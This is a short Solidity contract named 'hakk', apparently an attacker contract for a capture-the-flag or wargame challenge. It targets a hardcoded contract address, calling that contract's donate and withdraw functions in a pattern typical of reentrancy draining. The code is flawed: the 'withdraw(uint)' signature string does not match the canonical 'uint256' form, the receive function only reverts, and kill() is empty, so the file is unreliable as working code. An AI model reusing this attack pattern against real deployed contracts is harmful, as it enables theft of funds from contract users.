//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

contract hakk{
address his=0x66527AaBc625776B93E37065134e6380bD2Ca009;


    function donate() public{
        his.call{value:1000000}(abi.encodeWithSignature('donate(address)',address(this)));
    }
    function withdraw() public{
        his.call(abi.encodeWithSignature('withdraw(uint)',500000));
    }
    function kill()external{}
    receive() external payable {revert();}
}

